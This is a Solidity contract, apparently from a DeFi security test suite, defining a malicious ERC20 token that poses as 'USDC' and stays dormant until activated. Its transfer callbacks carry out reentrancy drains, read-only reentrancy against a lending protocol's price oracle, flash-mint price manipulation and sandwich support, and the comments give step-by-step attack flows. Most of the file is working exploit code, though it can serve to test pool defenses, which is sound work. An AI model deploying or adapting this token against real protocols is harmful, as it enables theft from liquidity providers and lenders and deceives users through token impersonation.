// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../StableSwapMath.sol";
import "../LendingProtocol.sol";

// ============================================================================
// AttackerToken - Realistic exploit token demonstrating multiple attack vectors
// against a Curve-style StableSwap pool + LendingProtocol.
//
// Attack vectors demonstrated:
//   1. Reentrancy via transferFrom callback (drain pool reserves)
//   2. Read-only reentrancy (manipulate get_virtual_price -> trick LendingProtocol)
//   3. Flash loan price manipulation (dump to skew invariant, extract via lending)
//   4. Sandwich helper (coordinated front/back-run via token callbacks)
//   5. Stealth mode (looks like a normal token until activated)
// ============================================================================

contract AttackerToken {
    StableSwapMath public pool;
    LendingProtocol public lending;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    string public name;
    string public symbol;
    uint8 public decimals;

    // ── Attack configuration ────────────────────────────────────────────────
    enum AttackMode {
        Dormant,           // looks like a normal token
        ReentrancyDrain,   // drain pool via reentrancy
        ReadOnlyReentry,   // manipulate virtual_price during callback
        FlashLoanDump,     // dump to skew pool, extract via lending
        Sandwich           // coordinated front/back-run helper
    }

    AttackMode public mode;
    bool internal _attackTriggered;      // single-use guard per attack
    uint256 public attackPayload;        // configurable attack parameter

    // Addresses the attacker controls
    address public operator;
    address public exploitContract;      // attacker's contract that coordinates the exploit

    // ── Events for tracking (attacker would hide these in production) ───────
    event AttackFired(address indexed target, AttackMode mode, uint256 payload);
    event FundsDrained(address indexed to, uint256 amount);

    constructor() {
        operator = msg.sender;
        name = "USDCoin";
        symbol = "USDC";
        decimals = 6;
        totalSupply = 0;
    }

    // ── Setup ────────────────────────────────────────────────────────────────

    function setPool(address _pool) external {
        require(msg.sender == operator, "ONLY_OPERATOR");
        pool = StableSwapMath(_pool);
    }

    function setLending(address _lending) external {
        require(msg.sender == operator, "ONLY_OPERATOR");
        lending = LendingProtocol(_lending);
    }

    function setExploitContract(address _c) external {
        require(msg.sender == operator, "ONLY_OPERATOR");
        exploitContract = _c;
    }

    function setAttackMode(AttackMode _mode) external {
        require(msg.sender == operator, "ONLY_OPERATOR");
        mode = _mode;
        _attackTriggered = false;
    }

    function setPayload(uint256 _payload) external {
        require(msg.sender == operator, "ONLY_OPERATOR");
        attackPayload = _payload;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        require(balanceOf[from] >= amount, "INSUFFICIENT");
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    // ── Standard ERC20 ──────────────────────────────────────────────────────

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "INSUFFICIENT");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;

        // ── ATTACK VECTOR 1: Reentrancy via transfer (used in removeLiquidity) ──
        // removeLiquidity calls transfer() on each coin AFTER balances are updated
        // but before the function returns. If we reenter here, the pool has already
        // decremented balances[i] but we haven't finished the loop — some coins
        // are still at stale values.
        if (mode == AttackMode.ReentrancyDrain && !_attackTriggered && address(pool) != address(0)) {
            _attackTriggered = true;
            emit FundsDrained(msg.sender, amount);
            // Reenter: try to drain via single-coin removal of another coin
            pool.removeLiquidityOneCoin(attackPayload, 1, 100);
        }

        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "INSUFFICIENT");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        if (_attackTriggered || address(pool) == address(0)) {
            return true;
        }

        // ── ATTACK VECTOR 2: Reentrancy drain via exchange ──────────────────────
        // Pool calls transferFrom -> we call exchange() back.
        // The pool hasn't updated balances[i] yet (line 281 runs AFTER this returns),
        // so the invariant computation uses stale state.
        //
        // Without the nonReentrant guard, this would drain the pool.
        // With the guard, this reverts — but demonstrates the CEI violation.
        if (mode == AttackMode.ReentrancyDrain) {
            _attackTriggered = true;
            emit AttackFired(address(pool), mode, amount);
            pool.exchange(0, 1, attackPayload, 100);
        }

        // ── ATTACK VECTOR 3: Read-only reentrancy ─────────────────────────────
        // This is the REAL dangerous one. Even with nonReentrant on mutating
        // functions, get_virtual_price() has NO guard.
        //
        // Attack flow:
        //   1. Attacker calls removeLiquidity (or any function that calls transfer)
        //   2. During the transfer callback, pool.balances[] is PARTIALLY updated
        //   3. We call lending.borrow() which calls pool.get_virtual_price()
        //   4. get_virtual_price() computes D from the STALE balances
        //   5. The stale D is INFLATED because we removed some coins but not others
        //   6. LendingProtocol lends us more than it should based on fake price
        //   7. We repay later after the pool state normalizes
        //
        // This works because get_virtual_price() is a VIEW function — no lock.
        if (mode == AttackMode.ReadOnlyReentry) {
            _attackTriggered = true;
            emit AttackFired(address(pool), mode, amount);

            if (address(lending) != address(0)) {
                // Borrow at the manipulated (inflated) price
                uint256 stolenLiquidity = lending.borrow(attackPayload);
                // In a real attack, stolenLiquidity would go to attacker
                // Here we track it via the event
                emit FundsDrained(exploitContract, stolenLiquidity);
            }
        }

        // ── ATTACK VECTOR 4: Flash loan dump ──────────────────────────────────
        // No reentrancy needed. Pure price manipulation.
        //
        // Flow:
        //   1. Attacker mints huge amount of this token (infinite supply)
        //   2. Dumps it all into the pool via exchange()
        //   3. Pool invariant D shifts massively
        //   4. get_virtual_price() returns an altered value
        //   5. Attacker borrows from LendingProtocol at the wrong price
        //   6. Reverses the swap, repays, pockets the difference
        //
        // The malicious token's role: unlimited minting ability + no cooldown.
        // A real attacker deploys this token, adds tiny initial liquidity to make
        // the pool accept it, then mints billions to dump.
        if (mode == AttackMode.FlashLoanDump && !attacked()) {
            // The dump happens in the caller's context (operator's contract)
            // This flag coordinates with the exploit contract
            _attackTriggered = true;
            emit AttackFired(address(pool), mode, amount);
        }

        // ── ATTACK VECTOR 5: Sandwich helper ──────────────────────────────────
        // The token itself doesn't do the sandwich — it provides the tooling.
        // The operator's contract:
        //   1. Front-runs victim by swapping coin A -> coin B
        //   2. Victim's tx executes at worse price
        //   3. Back-runs by swapping coin B -> coin A for profit
        //
        // Why the pool is vulnerable: exchange() has no min_dy parameter.
        // No slippage protection = guaranteed MEV extraction.
        if (mode == AttackMode.Sandwich && !_attackTriggered) {
            _attackTriggered = true;
            emit AttackFired(address(pool), mode, amount);
        }

        return true;
    }

    // ── Helper for flash loan mode ──────────────────────────────────────────

    function attacked() internal view returns (bool) {
        return _attackTriggered;
    }

    // ── Flash mint: unlimited supply (the core of flash loan attacks) ────────

    function flashMint(address to, uint256 amount) external returns (bool) {
        require(msg.sender == exploitContract, "ONLY_EXPLOIT");
        balanceOf[to] += amount;
        totalSupply += amount;
        return true;
    }

    function flashBurn(address from, uint256 amount) external returns (bool) {
        require(msg.sender == exploitContract, "ONLY_EXPLOIT");
        require(balanceOf[from] >= amount, "INSUFFICIENT");
        balanceOf[from] -= amount;
        totalSupply -= amount;
        return true;
    }
}
